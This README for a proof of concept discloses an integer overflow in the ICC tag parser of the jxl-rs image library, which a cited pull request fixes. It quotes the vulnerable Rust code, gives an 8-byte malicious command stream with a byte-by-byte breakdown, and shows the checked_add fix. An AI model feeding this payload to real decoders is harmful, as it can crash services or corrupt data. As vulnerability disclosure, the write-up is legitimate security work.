# POC: ICC Integer Overflow DoS in jxl-rs

This demonstrates the integer overflow vulnerability in ICC tag parsing, fixed in [PR #602](https://github.com/libjxl/jxl-rs/pull/602).

## Vulnerability

In `jxl/src/icc/tag.rs`, the following code has integer overflow vulnerabilities:

```rust
// Line 53-54
let tagstart = if command & 64 == 0 {
    prev_tagstart + prev_tagsize  // CAN OVERFLOW!
}

// Lines 84-87
decoded_profile.write_u32::<BigEndian>(tagstart + tagsize)?;     // gXYZ
decoded_profile.write_u32::<BigEndian>(tagstart + tagsize * 2)?; // bXYZ
```

## Impact

| Build Mode | Behavior |
|------------|----------|
| **Debug**  | Panic: "attempt to add with overflow" → **DoS (crash)** |
| **Release** | Silent wrap → **Data corruption**, potential security bypass |

## Files

- `src/main.rs` - POC demonstrating the overflow
- `malicious_icc_commands.bin` - Raw ICC command stream bytes that trigger overflow
- `../vuln_icc_commands.bin` - Same file, renamed for clarity

## Usage

```bash
# Show the crash (debug mode)
cargo run

# Show silent corruption (simulated release mode)
cargo run -- --wrap

# Create the malicious ICC command stream binary
cargo run -- --create
```

## Malicious ICC Command Stream

The 8-byte payload `82 80 FF FF FF 0F 03 00`:

```
[0x82]           - Tag 1: rTRC with explicit tagsize (bit7=1)
[80 FF FF FF 0F] - Varint: 0xFFFFFF80 (4294967168 bytes - absurdly large)
[0x03]           - Tag 2: rXYZ, compute tagstart from prev (bit6=0)
[0x00]           - End marker
```

When parsing Tag 2:
```
tagstart = prev_tagstart + prev_tagsize
tagstart = 0x8C + 0xFFFFFF80
tagstart = 0x10000000C  →  OVERFLOW  →  0x0000000C (12 bytes into header!)
```

## Note on JXL Files

The ICC data in JXL files is entropy-coded (ANS), making it non-trivial to craft a complete malicious `.jxl` file. The `vuln_icc_commands.bin` contains the raw command stream that would trigger the overflow if it could be properly encoded into a JXL file's ICC box.

## Fix

PR #602 fixes this by using `checked_add()`:

```rust
let tagstart = prev_tagstart
    .checked_add(prev_tagsize)
    .ok_or(Error::InvalidIccStream)?;
```
